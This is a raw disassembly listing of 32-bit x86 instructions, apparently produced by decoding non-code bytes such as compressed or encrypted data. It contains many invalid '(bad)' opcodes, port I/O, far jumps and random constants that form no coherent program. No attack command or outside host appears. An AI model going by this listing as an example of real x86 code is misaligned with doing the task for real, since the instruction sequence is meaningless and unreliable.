  42166b:	in     eax,dx
  42166c:	call   0x6bf1090b
  421671:	mov    eax,ds:0x855a9804
  421676:	add    edx,DWORD PTR [ecx+0x4a846e9f]
  42167c:	lahf   
  42167d:	ret    
  42167e:	popf   
  42167f:	jo     0x42161e
  421681:	jns    0x42165b
  421683:	nop
  421684:	pop    ecx
  421685:	scas   eax,DWORD PTR es:[edi]
  421686:	ins    BYTE PTR es:[edi],dx
  421687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421688:	lock aad 0xe3
  42168b:	lahf   
  42168c:	aam    0xc3
  42168e:	push   ebx
  42168f:	mov    edi,0x88b18e0e
  421694:	test   bl,cl
  421696:	sti    
  421697:	enter  0xe138,0x90
  42169b:	add    DWORD PTR [edx+0x498f7864],ebp
  4216a1:	bndstx [edx-0x7f],bnd0
  4216a5:	xchg   BYTE PTR [esp+edx*1+0x6f37de10],dh
  4216ac:	dec    edi
  4216ad:	leave  
  4216ae:	aas    
  4216af:	stos   DWORD PTR es:[edi],eax
  4216b0:	cwde   
  4216b1:	xchg   esp,eax
  4216b2:	jbe    0x4216b2
  4216b4:	fild   WORD PTR [edi+0x348a5f64]
  4216ba:	fwait
  4216bb:	pop    ecx
  4216bc:	push   ds
  4216bd:	adc    ebp,DWORD PTR [ebx+0x318a6d19]
  4216c3:	lea    eax,[edx]
  4216c5:	leave  
  4216c6:	outs   dx,BYTE PTR ds:[esi]
  4216c7:	mov    ebp,DWORD PTR [ecx+ebp*4]
  4216ca:	test   BYTE PTR [edx-0x23eb8f7b],dh
  4216d0:	jmp    0x9a00:0xe618348a
  4216d7:	(bad)  
  4216d8:	jmp    0x4216a6
  4216da:	in     al,dx
  4216db:	cmp    al,0x9
  4216dd:	test   eax,0x6395a92f
  4216e2:	mov    BYTE PTR [eax+0x16bea0f2],ah
  4216e8:	outs   dx,DWORD PTR ds:[esi]
  4216e9:	repnz (bad)
  4216ec:	ins    BYTE PTR es:[edi],dx
  4216ed:	push   ebp
	...
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	push   esi
  421763:	outs   dx,DWORD PTR ds:[esi]
  421764:	push   eax
  421765:	out    dx,al
  421766:	addr16 add DWORD PTR [bx+si],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	sbb    bl,BYTE PTR [edi]
  421770:	lahf   
  421771:	jmp    0xdac6bce6
  421776:	mov    ds:0x8d2a7f0b,eax
  42177b:	ret    
  42177c:	inc    ebp
  42177d:	aas    
  42177e:	xor    al,0xd9
  421780:	into   
  421781:	adc    DWORD PTR [ecx+0x38],0x4ef9ceb2
  421788:	fldenv [ebx-0x7cd6c79f]
  42178e:	enter  0x6fb1,0x31
  421792:	mov    cl,0x25
  421794:	imul   ebx,eax,0x607d3e9f
  42179a:	inc    ecx
  42179b:	xor    DWORD PTR es:[esi+0x44],edx
  42179f:	mov    DWORD PTR [edx-0x63678063],edx
  4217a5:	xchg   edx,eax
  4217a6:	adc    al,0xd7
  4217a8:	xchg   ah,ah
  4217aa:	call   0x35b699f3
  4217af:	das    
  4217b0:	dec    ecx
  4217b1:	enter  0xb9b2,0x45
  4217b5:	or     bh,BYTE PTR [ebx+ecx*4]
  4217b8:	(bad)  
  4217b9:	fidivr WORD PTR [edx+0x58]
  4217bc:	fiadd  WORD PTR [edi+0x47]
  4217bf:	jae    0x421753
  4217c1:	mov    DWORD PTR [edi-0x55],ebx
  4217c4:	sar    eax,1
  4217c6:	popf   
  4217c7:	or     DWORD PTR [eax+0x38],edi
  4217ca:	xchg   esi,eax
  4217cb:	push   eax
  4217cc:	sub    al,0xc0
  4217ce:	jge    0x4217c9
  4217d0:	cmp    eax,0x50cc1ca0
  4217d6:	aad    0x89
  4217d8:	jecxz  0x42177d
  4217da:	and    eax,0xc5a7e060
  4217df:	(bad)  
  4217e0:	cmp    BYTE PTR [ebp-0xb],ah
  4217e3:	call   0x81ee451f
  4217e8:	std    
  4217e9:	adc    BYTE PTR [ebx-0x5a],al
  4217ec:	aaa    
  4217ed:	inc    esp
  4217ee:	ror    al,cl
  4217f0:	out    0xd4,eax
  4217f2:	cwde   
  4217f3:	in     eax,0x9f
  4217f5:	xor    DWORD PTR [edx],edi
  4217f7:	mov    edx,0xeed779b3
  4217fc:	inc    esi
  4217fd:	mov    edi,0x38154fc0
  421802:	jg     0x421825
  421804:	outs   dx,BYTE PTR ds:[esi]
  421805:	pop    edx
  421806:	push   ss
  421807:	aas    
  421808:	push   ss
  421809:	sahf   
  42180a:	mov    bl,0x1d
  42180c:	dec    edi
  42180d:	shr    DWORD PTR [ebx-0x486e58ba],cl
  421813:	xlat   BYTE PTR ds:[ebx]
  421814:	mov    ch,0x58
  421816:	aaa    
  421817:	sub    DWORD PTR [ecx+0x4b4c5f05],0x65
  42181e:	in     eax,0x3f
  421820:	int    0x91
  421822:	aam    0xe
  421824:	xor    cl,BYTE PTR [edx+0x2a]
  421827:	test   al,0x6e
  421829:	mov    ch,0x2
  42182b:	pushf  
  42182c:	and    BYTE PTR [edi+0x49db1cd4],dh
  421832:	in     al,0x66
  421834:	fdiv   QWORD PTR [edx+0x41bdba6c]
  42183a:	push   sp
  42183c:	cs xchg cl,bh
  42183f:	rcl    BYTE PTR [ecx-0x327f8a6b],0x8a
  421846:	imul   ebx,DWORD PTR [ebx-0x24],0x88fabe73
  42184d:	add    BYTE PTR [edi+0x56ff6582],dh
  421853:	cld    
  421854:	push   esp
  421855:	or     BYTE PTR [ebx+0x4d],ah
  421858:	mov    cl,0x39
  42185a:	imul   edi,ecx,0x1878f1b3
  421860:	retf   
  421861:	clc    
  421862:	(bad)  
  421863:	ds inc ecx
  421865:	das    
  421866:	inc    esi
  421867:	push   es
  421868:	xor    eax,0x525918a6
  42186d:	fld    DWORD PTR [eax]
	...
  4218d3:	add    BYTE PTR [eax],al
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	pop    ds
  4218e3:	dec    edi
  4218e4:	adc    eax,0x1686775
  4218e9:	add    BYTE PTR [eax],al
  4218eb:	add    DWORD PTR [eax],eax
  4218ed:	add    BYTE PTR [edx],al
  4218ef:	mov    ebp,DWORD PTR [esi+ebx*4+0x727c74c2]
  4218f6:	sub    eax,0xde8f1446
  4218fb:	xchg   edi,eax
  4218fc:	xor    esi,ebp
  4218fe:	pop    edx
  4218ff:	adc    BYTE PTR [edi-0x78],ah
  421902:	dec    ecx
  421903:	dec    esp
  421904:	add    BYTE PTR [esi-0x1a],cl
  421907:	fistp  DWORD PTR [ebx]
  421909:	repnz inc edx
  42190b:	xor    al,0x43
  42190d:	sbb    BYTE PTR [ebx],ch
  42190f:	mov    cl,0x9b
  421911:	sbb    DWORD PTR [eax+0x74618d71],ecx
  421917:	push   eax
  421918:	clc    
  421919:	sub    BYTE PTR [eax-0xf],ah
  42191c:	ss adc al,0x49
  42191f:	iret   
  421920:	xchg   ebp,eax
  421921:	je     0x4218de
  421923:	fstp   DWORD PTR [eiz*1-0x3eb696fc]
  42192a:	(bad)  
  42192b:	repnz jmp 0xa64f:0xe669f5bd
  421933:	enter  0xe1f3,0xbe
  421937:	mov    al,0xc2
  421939:	jle    0x4218f0
  42193b:	mov    ah,0x25
  42193d:	std    
  42193e:	mov    al,0x84
  421940:	add    eax,0x81698c0b
  421945:	in     eax,dx
  421946:	shr    DWORD PTR [edi],cl
  421948:	and    bl,BYTE PTR [esi+0x4f]
  42194b:	out    0x96,eax
  42194d:	loope  0x421924
  42194f:	fld    TBYTE PTR [edi+0x47]
  421952:	mov    BYTE PTR [edi],ah
  421954:	pop    ebp
  421955:	fucomi st,st(1)
  421957:	aad    0x34
  421959:	scas   al,BYTE PTR es:[edi]
  42195a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42195b:	mov    ebp,0xe01f97c2
  421960:	pop    ebp
  421961:	int3   
  421962:	lods   eax,DWORD PTR ds:[esi]
  421963:	xlat   BYTE PTR ds:[ebx]
  421964:	pop    edi
  421965:	lods   eax,DWORD PTR ds:[esi]
  421966:	jl     0x42193d
  421968:	jmp    0x4219d0
  42196a:	outs   dx,DWORD PTR ds:[esi]
  42196b:	fcomp  st(6)
  42196d:	push   ecx
  42196e:	mov    esi,ecx
  421970:	hlt    
  421971:	out    dx,al
  421972:	jns    0x421985
  421974:	stos   BYTE PTR es:[edi],al
  421975:	jge    0x42198b
  421977:	into   
  421978:	xchg   edi,eax
  421979:	lods   eax,DWORD PTR ds:[esi]
  42197a:	add    ebp,DWORD PTR [ebp+0x2f]
  42197d:	stos   BYTE PTR es:[edi],al
  42197e:	je     0x421961
  421980:	adc    BYTE PTR [esi+0x82c4c25],dl
  421986:	retf   0x8cd8
  421989:	mov    dl,BYTE PTR [edx+0x2a]
  42198c:	int3   
  42198d:	in     al,0xe0
  42198f:	jmp    0x4219ce
  421991:	push   es
  421992:	xlat   BYTE PTR ds:[ebx]
  421993:	sub    DWORD PTR [ecx+ebp*8],0xffffffba
  421997:	sub    ah,BYTE PTR [edx-0x6609b380]
  42199d:	pop    ebx
  42199e:	fbstp  TBYTE PTR [edi+0x7a05fd69]
  4219a4:	push   cs
  4219a5:	call   0xe5b:0x1efa851c
  4219ac:	ins    BYTE PTR es:[edi],dx
  4219ad:	retf   0x48f5
  4219b0:	jp     0x421949
  4219b2:	push   0x25
  4219b4:	cs push cs
  4219b6:	call   0x96b7:0x96d8e8aa
  4219bd:	repnz (bad) 
  4219bf:	shl    cl,cl
  4219c1:	imul   esp,DWORD PTR [edx+0x54ed489c],0xffffffe0
  4219c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219c9:	mov    esi,0xb60b31d8
  4219ce:	sbb    BYTE PTR [esi-0x34],ch
  4219d1:	aaa    
  4219d2:	adc    dh,BYTE PTR [eax+ebp*1+0x65cf21c6]
  4219d9:	cmp    BYTE PTR [ebp-0x19],0x5e
  4219dd:	pop    eax
  4219de:	arpl   WORD PTR [eax-0x532299f1],si
  4219e4:	and    ah,bl
  4219e6:	jnp    0x421a1a
  4219e8:	pop    ebp
  4219e9:	jl     0x421a0e
  4219eb:	push   eax
  4219ec:	cwde   
  4219ed:	pop    es
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	push   edi
  421a63:	and    edx,edx
  421a65:	loop   0x421ace
  421a67:	imul   eax,DWORD PTR [ecx],0x10000
  421a6d:	add    BYTE PTR [eax-0x2a15c232],dl
  421a73:	(bad)  
  421a74:	out    0x4c,eax
  421a76:	mov    ebp,0xf3f99edc
  421a7b:	imul   eax,DWORD PTR [ecx+ebp*2-0x14],0xffffff94
  421a80:	lods   eax,DWORD PTR ds:[esi]
  421a81:	loope  0x421a7c
  421a83:	fidiv  WORD PTR [eax+eax*2+0x7e5f722e]
  421a8a:	dec    esp
  421a8b:	mov    WORD PTR [eax-0x4],?
  421a8e:	mov    ds:0x6dafb677,al
  421a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a94:	je     0x421ab7
  421a96:	mov    WORD PTR [ecx],gs
  421a98:	in     al,0xb7
  421a9a:	push   edx
  421a9b:	scas   al,BYTE PTR es:[edi]
  421a9c:	or     dl,BYTE PTR [edi-0x57caf85]
  421aa2:	jg     0x421a8d
  421aa4:	aaa    
  421aa5:	sbb    edx,DWORD PTR [ecx+ebp*1-0x58]
  421aa9:	int    0x35
  421aab:	cdq    
  421aac:	pusha  
  421aad:	xchg   esp,eax
  421aae:	shl    eax,cl
  421ab0:	and    ebp,DWORD PTR [ecx]
  421ab2:	mov    ch,0x86
  421ab4:	cmp    eax,0xb482a6ad
  421ab9:	pop    ebx
  421aba:	inc    ecx
  421abb:	mov    edx,0xfc0663d5
  421ac0:	aaa    
  421ac1:	shl    BYTE PTR [ecx+eax*2],1
  421ac4:	pop    ebp
  421ac5:	mov    ebp,0xcb41dd62
  421aca:	lock popf 
  421acc:	sub    ebp,DWORD PTR [ecx+ecx*4]
  421acf:	jp     0x421a8e
  421ad1:	mov    ds:0x282dd3a5,eax
  421ad6:	in     al,dx
  421ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ad8:	cmp    BYTE PTR [edi-0x1e1616f8],dl
  421ade:	sahf   
  421adf:	into   
  421ae0:	imul   ebp,DWORD PTR [esi-0x217c1f81],0xffffffe3
  421ae7:	lock into 
  421ae9:	sbb    eax,0x4453fcf4
  421aee:	outs   dx,DWORD PTR es:[esi]
  421af0:	jp     0x421aed
  421af2:	mov    BYTE PTR [edx+eax*1],dl
  421af5:	iret   
  421af6:	pop    ds
  421af7:	mov    dh,0xe3
  421af9:	add    al,0xad
  421afb:	in     al,dx
  421afc:	jo     0x421ab2
  421afe:	or     eax,0xa6a48c8b
  421b03:	test   BYTE PTR [esp+ebp*4],al
  421b06:	ds cwde 
  421b08:	add    cl,BYTE PTR [eax+0x283cfcad]
  421b0e:	sbb    DWORD PTR [edi-0x2d],ebp
  421b11:	push   ecx
  421b12:	push   ss
  421b13:	xchg   DWORD PTR ds:0x3f8b8642,ebp
  421b19:	mov    bl,0xe1
  421b1b:	mov    al,BYTE PTR ds:0xba910199
  421b21:	dec    edi
  421b22:	nop
  421b23:	js     0x421b3d
  421b25:	adc    edi,DWORD PTR [edi]
  421b27:	cld    
  421b28:	(bad)  
  421b29:	or     DWORD PTR [edi+0x5264ea3c],edx
  421b2f:	dec    ecx
  421b30:	stos   DWORD PTR es:[edi],eax
  421b31:	das    
  421b32:	cmp    eax,0xeab82ec2
  421b37:	int3   
  421b38:	adc    ecx,ebx
  421b3a:	mov    BYTE PTR [esi-0x7743acbd],al
  421b40:	or     dl,dl
  421b42:	adc    al,0xc9
  421b44:	mov    dl,BYTE PTR [ebx+0x35]
  421b47:	icebp  
  421b48:	inc    esp
  421b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b4a:	sub    DWORD PTR [esi-0x44],eax
  421b4d:	mov    BYTE PTR [edi+0x18],bl
  421b50:	jmp    0xe006:0x2337db3
  421b57:	jns    0x421afe
  421b59:	dec    ecx
  421b5a:	jb     0x421b86
  421b5c:	call   0x3da6:0x66ccf99e
  421b63:	les    edx,FWORD PTR [ecx]
  421b65:	xor    eax,0xd153254f
  421b6a:	arpl   di,bx
  421b6c:	rcl    BYTE PTR [edi+0x0],cl
	...
  421bd3:	add    BYTE PTR [eax],al
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     ch,BYTE PTR [eax]
  421be3:	repnz (bad) 
  421be5:	sbb    DWORD PTR [edi+0x6a],esp
  421be8:	add    DWORD PTR [eax],eax
  421bea:	add    BYTE PTR [ecx],al
  421bec:	add    BYTE PTR [eax],al
  421bee:	xor    ch,BYTE PTR [ebp-0x4dd51648]
  421bf4:	imul   ecx,DWORD PTR ds:0x950d54df,0x37fe2788
  421bfe:	cli    
  421bff:	or     eax,0xb56f5da
  421c04:	cmp    edi,edx
  421c06:	jmp    0x421c6b
  421c08:	inc    edi
  421c09:	xchg   esp,eax
  421c0a:	push   edx
  421c0b:	push   0xffffff9a
  421c0d:	jmp    0x8de4:0x14584b77
  421c14:	and    bh,al
  421c16:	mov    al,ds:0xe32aefc3
  421c1b:	xchg   DWORD PTR [esi+0x784eaf1a],edi
  421c21:	jb     0x421bc5
  421c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c24:	imul   ebx,DWORD PTR [edx-0x53],0xffffff82
  421c28:	push   edx
  421c29:	retf   
  421c2a:	fisttp DWORD PTR [edx]
  421c2c:	stos   DWORD PTR es:[edi],eax
  421c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c2e:	loopne 0x421c56
  421c30:	add    al,bl
  421c32:	popa   
  421c33:	dec    eax
  421c34:	dec    DWORD PTR [ebp-0x5bd8af17]
  421c3a:	in     eax,0xaa
  421c3c:	mov    al,0x62
  421c3e:	xor    eax,ebx
  421c40:	fs jnp 0x421bfd
  421c43:	jne    0x421be1
  421c45:	jmp    0xa5ab:0xe3d67cd1
  421c4c:	lock hlt 
  421c4e:	pop    ss
  421c4f:	xor    ch,dh
  421c51:	jbe    0x421c97
  421c53:	psubsw mm3,QWORD PTR [eax]
  421c56:	push   esp
  421c57:	dec    edx
  421c58:	aam    0xc7
  421c5a:	stos   BYTE PTR es:[edi],al
  421c5b:	loopne 0x421c99
  421c5d:	jb     0x421be2
  421c5f:	gs sahf 
  421c61:	dec    esp
  421c62:	lods   eax,DWORD PTR ds:[esi]
  421c63:	xchg   ebx,eax
  421c64:	stos   DWORD PTR es:[edi],eax
  421c65:	lds    edx,FWORD PTR [ecx+eax*2-0x5de908c8]
  421c6c:	jmp    0x9e07:0x3d55cee6
  421c73:	test   eax,0x560e71
  421c78:	push   esi
  421c79:	add    al,0xc1
  421c7b:	lods   eax,DWORD PTR ds:[esi]
  421c7c:	jmp    0xd756:0xb88768e
  421c83:	(bad)  
  421c84:	xor    DWORD PTR [eax-0x62fb87b8],edx
  421c8a:	div    BYTE PTR [ebp+0x3e]
  421c8d:	cs rep ins DWORD PTR es:[edi],dx
  421c90:	jb     0x421c94
  421c92:	adc    eax,0xc2d35e3a
  421c97:	sar    ebx,1
  421c99:	jle    0x421d17
  421c9b:	imul   esi,eax,0x7c
  421c9e:	(bad)  
  421ca0:	push   eax
  421ca1:	pop    esp
  421ca2:	ds rcr esp,0x21
  421ca6:	popf   
  421ca7:	and    al,0x74
  421ca9:	or     edx,DWORD PTR [eax]
  421cab:	popa   
  421cac:	imul   ebx,DWORD PTR [edi+0x3d],0x6029475a
  421cb3:	dec    ebx
  421cb4:	mov    ds:0x156f2abf,al
  421cb9:	add    BYTE PTR [ebp-0x3c05a060],bh
  421cbf:	std    
  421cc0:	iret   
  421cc1:	xchg   ecx,eax
  421cc2:	in     eax,0x83
  421cc4:	push   edx
  421cc5:	fld    TBYTE PTR [edi-0x4c8a6786]
  421ccb:	cmp    DWORD PTR [edi-0x22],eax
  421cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ccf:	jb     0x421d37
  421cd1:	(bad)  
  421cd2:	sar    ecx,1
  421cd4:	bound  edi,QWORD PTR [eax+0x6cdda51b]
  421cda:	loope  0x421d4f
  421cdc:	cs mov esp,0x46d8e3cd
  421ce2:	sub    ah,BYTE PTR [esi+ebx*1+0x20555ec2]
  421ce9:	test   DWORD PTR [ebx+0x28],esp
  421cec:	cmp    eax,0xb1
	...
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	clc    
  421d63:	or     bh,ah
  421d65:	retf   0x6b67
  421d68:	add    DWORD PTR [eax],eax
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	mov    eax,DWORD PTR [edx]
  421d70:	mul    esi
  421d72:	or     eax,DWORD PTR [eax-0xf72f768]
  421d78:	pushf  
  421d79:	push   es
  421d7a:	popa   
  421d7b:	lds    esi,FWORD PTR [ecx-0x58]
  421d7e:	(bad)  
  421d7f:	lds    edi,FWORD PTR [esi-0x61adf974]
  421d85:	outs   dx,DWORD PTR ds:[esi]
  421d86:	icebp  
  421d87:	mov    edi,0x762118df
  421d8c:	iret   
  421d8d:	sub    DWORD PTR [edx-0x6d],ecx
  421d90:	stc    
  421d91:	test   BYTE PTR [ecx],bh
  421d93:	int    0x83
  421d95:	mov    dl,0xb7
  421d97:	rcl    BYTE PTR [eax-0x70],cl
  421d9a:	inc    ebp
  421d9b:	xchg   BYTE PTR [esi+0x71],cl
  421d9e:	stos   BYTE PTR es:[di],al
  421da0:	mov    edx,0x6fb24bb1
  421da5:	sub    BYTE PTR [edx+0x79],bl
  421da8:	dec    ecx
  421da9:	cdq    
  421daa:	(bad)  [ebx+0x31]
  421dad:	outs   dx,DWORD PTR ds:[esi]
  421dae:	cwde   
  421daf:	cmp    ch,dh
  421db1:	rcl    BYTE PTR [ebp+0x322d2509],cl
  421db7:	xor    al,0x84
  421db9:	add    DWORD PTR [edi+0x68],ebp
  421dbc:	pop    eax
  421dbd:	dec    edx
  421dbe:	dec    eax
  421dbf:	ret    
  421dc0:	je     0x421df7
  421dc2:	pusha  
  421dc3:	sub    BYTE PTR [edx-0x336e2c0b],bh
  421dc9:	out    0x1e,eax
  421dcb:	(bad)  
  421dcd:	push   ds
  421dce:	dec    ebx
  421dcf:	sub    eax,0x1776ef3d
  421dd4:	mov    ds:0x8e601a3a,eax
  421dd9:	out    0xf4,eax
  421ddb:	pop    edx
  421ddc:	pop    esp
  421ddd:	(bad)  
  421dde:	jg     0x421e17
  421de0:	xor    ebp,esi
  421de2:	popa   
  421de3:	mov    esp,0x4895f39e
  421de8:	push   edi
  421de9:	test   al,0xb1
  421deb:	in     al,dx
  421dec:	fadd   QWORD PTR [edi-0x3350d5a6]
  421df2:	push   edi
  421df3:	lds    edx,FWORD PTR [ebx]
  421df5:	or     BYTE PTR [ebp+0x26],0x2
  421df9:	add    DWORD PTR [ebx-0x58fb6bf3],ebp
  421dff:	cmp    eax,0x8af34cec
  421e04:	arpl   WORD PTR [eax],di
  421e06:	cmp    BYTE PTR [edx-0x3b4c4a84],bl
  421e0c:	aad    0x34
  421e0e:	(bad)  
  421e10:	pushf  
  421e11:	mov    ds:0x426a5b11,eax
  421e16:	sub    al,0xea
  421e18:	pop    edi
  421e19:	adc    al,0xbe
  421e1b:	mov    dl,0x69
  421e1d:	xor    DWORD PTR [eax],ecx
  421e1f:	add    al,0xe3
  421e21:	push   esi
  421e22:	sub    esp,esp
  421e24:	bound  eax,QWORD PTR [ebx]
  421e26:	adc    al,0xe6
  421e28:	nop
  421e29:	and    ah,BYTE PTR [edi]
  421e2b:	mov    eax,ds:0xba7c9dc7
  421e30:	adc    DWORD PTR [edx+0x6148ed1a],0xffffff99
  421e37:	jmp    0x59b724b5
  421e3c:	sub    ebp,DWORD PTR [eax-0x59c90525]
  421e42:	mov    bp,0x7016
  421e46:	rcl    BYTE PTR [ebx+0x73fb78fe],1
  421e4c:	test   eax,0x1056bb41
  421e51:	fwait
  421e52:	nop
  421e53:	outs   dx,DWORD PTR ds:[esi]
  421e54:	in     eax,0x6f
  421e56:	sahf   
  421e57:	mov    esp,eax
  421e59:	fisttp QWORD PTR [esi+0x33]
  421e5c:	adc    eax,0xdd89551c
  421e61:	ss xor ch,dh
  421e64:	sbb    BYTE PTR [edx-0x61],dl
  421e67:	fdivp  st(0),st
  421e69:	jns    0x421e83
  421e6b:	push   esi
  421e6c:	xchg   ebp,eax
  421e6d:	inc    ecx
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	sbb    cl,dh
  421ee4:	stc    
  421ee5:	sbb    DWORD PTR [edi+0x6c],esp
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	fistp  DWORD PTR [edx]
  421ef0:	stc    
  421ef1:	inc    edi
  421ef2:	sub    dh,BYTE PTR [edx+eax*2-0x28c2e674]
  421ef9:	(bad)  
  421efb:	enter  0x2b3d,0xb2
  421eff:	mov    dh,0x4b
  421f01:	rcl    BYTE PTR [esi+0x70],cl
  421f04:	popa   
  421f05:	xchg   ebp,eax
  421f06:	inc    eax
  421f07:	or     eax,0xcca7c9bd
  421f0c:	rcl    DWORD PTR [edi],cl
  421f0e:	je     0x421f16
  421f10:	cwde   
  421f11:	fdivr  DWORD PTR [edx-0x69e55d37]
  421f17:	add    eax,0xfbb2b22e
  421f1c:	pop    ecx
  421f1d:	dec    ebx
  421f1e:	push   ebp
  421f1f:	ja     0x421f66
  421f21:	sub    eax,0x816ecda2
  421f26:	hlt    
  421f27:	or     DWORD PTR [edi+0x7b5da631],ebx
  421f2d:	das    
  421f2e:	mov    eax,DWORD PTR [esi+0x63]
  421f31:	pop    edx
  421f32:	or     al,0x83
  421f34:	(bad)  
  421f35:	cmc    
  421f36:	out    dx,al
  421f37:	or     ebp,DWORD PTR [ebp+0x9]
  421f3a:	push   esp
  421f3b:	jae    0x421f70
  421f3d:	sbb    BYTE PTR [ecx],0x9e
  421f40:	gs mov ebp,edi
  421f43:	xor    DWORD PTR [edi-0x1daa3db0],edi
  421f49:	call   0x809a:0x623ae2e6
  421f50:	pop    ebp
  421f51:	xchg   ebp,eax
  421f52:	mov    al,0x74
  421f54:	imul   ebp,DWORD PTR [ebx-0x6fd782ee],0x19
  421f5b:	add    eax,0xc069b877
  421f60:	xchg   esi,eax
  421f61:	in     al,dx
  421f62:	push   ss
  421f63:	sbb    al,0x3c
  421f65:	lods   al,BYTE PTR ds:[esi]
  421f66:	out    dx,al
  421f67:	into   
  421f68:	dec    ecx
  421f69:	adc    DWORD PTR [ecx+eax*8-0x76],0x72
  421f6e:	test   al,0xc8
  421f70:	mov    bh,0x14
  421f72:	xchg   esi,eax
  421f73:	sbb    eax,0xc1562647
  421f78:	jmp    0x2d175ee
  421f7d:	jge    0x421fdf
  421f7f:	push   esi
  421f80:	jnp    0x421fc8
  421f82:	and    al,BYTE PTR [ebx+0x7d]
  421f85:	int3   
  421f86:	sahf   
  421f87:	test   dl,dl
  421f89:	sbb    DWORD PTR [esp+edx*4],edi
  421f8c:	pop    esi
  421f8d:	mov    gs,ecx
  421f8f:	test   eax,0xe94fc209
  421f94:	outs   dx,BYTE PTR ds:[esi]
  421f95:	(bad)  
  421f96:	cmp    eax,0x8900c911
  421f9b:	or     DWORD PTR [ebp-0x3a],ecx
  421f9e:	and    DWORD PTR [edi-0x5d],esp
  421fa1:	pop    DWORD PTR [edx-0x80]
  421fa4:	jge    0x421fbe
  421fa6:	push   esp
  421fa7:	sub    WORD PTR [eax],cx
  421faa:	mov    ds:0xd0d0c86a,al
  421faf:	xchg   edi,eax
  421fb0:	sar    BYTE PTR ds:0xa799d6e0,1
  421fb6:	xor    ch,BYTE PTR [eax+0x22df519a]
  421fbc:	les    ebp,FWORD PTR [esi]
  421fbe:	xor    DWORD PTR [ecx-0x60],esp
  421fc1:	call   eax
  421fc3:	lahf   
  421fc4:	rol    DWORD PTR [ebx+0x4b],cl
  421fc7:	into   
  421fc8:	cld    
  421fc9:	mov    ah,0x56
  421fcb:	push   ds
  421fcc:	ret    
  421fcd:	cmc    
  421fce:	lds    esp,FWORD PTR [ebx+0x665b1150]
  421fd4:	mov    ?,esp
  421fd6:	mov    esi,0xd794c7c4
  421fdb:	sub    eax,0xafbd3cbf
  421fe0:	jg     0x421f8b
  421fe2:	adc    dh,bh
  421fe4:	adc    eax,0x94c1b452
  421fe9:	add    ch,al
  421feb:	push   es
  421fec:	dec    ebp
  421fed:	push   ecx
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 je 0x422020
  422064:	jbe    0x42209d
  422066:	ins    DWORD PTR es:[di],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	arpl   bx,cx
  422070:	pop    ebx
  422071:	fst    DWORD PTR [ecx]
  422073:	js     0x422077
  422075:	and    eax,0x86da166f
  42207a:	mov    ds:0x6077ac91,al
  42207f:	mov    bh,0x39
  422081:	stos   DWORD PTR es:[edi],eax
  422082:	leave  
  422083:	repnz add al,0xbb
  422086:	sub    bh,bl
  422088:	out    0x11,al
  42208a:	loop   0x42203e
  42208c:	imul   cl
  42208e:	outs   dx,BYTE PTR ds:[esi]
  42208f:	dec    ebp
  422090:	push   ds
  422091:	shr    DWORD PTR [edx],1
  422093:	xchg   ecx,edx
  422095:	adc    al,0x7d
  422097:	sub    edi,DWORD PTR [edx-0xb55ec5]
  42209d:	shl    BYTE PTR [edi+0x1b],cl
  4220a0:	sub    eax,0x8e182292
  4220a5:	test   DWORD PTR [edx+0x17],eax
  4220a8:	mov    ch,0x30
  4220aa:	stos   BYTE PTR es:[edi],al
  4220ab:	test   DWORD PTR [eax+ebx*8-0x44589beb],eax
  4220b2:	ja     0x4220d3
  4220b4:	imul   ecx,DWORD PTR [eax],0xffffffed
  4220b7:	into   
  4220b8:	out    dx,eax
  4220b9:	in     al,dx
  4220ba:	dec    ebp
  4220bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220bc:	push   ss
  4220bd:	inc    BYTE PTR [esi-0x7a7a8954]
  4220c3:	neg    BYTE PTR [esi]
  4220c5:	jo     0x4220b6
  4220c7:	mov    esi,0xee886054
  4220cc:	fwait
  4220cd:	inc    esi
  4220ce:	retf   0xf31e
  4220d1:	xlat   BYTE PTR ds:[ebx]
  4220d2:	out    0xfd,al
  4220d4:	adc    BYTE PTR ds:0xb81062b9,bl
  4220da:	cld    
  4220db:	ins    BYTE PTR es:[edi],dx
  4220dc:	mov    ah,0x35
  4220de:	out    0x6f,eax
  4220e0:	sti    
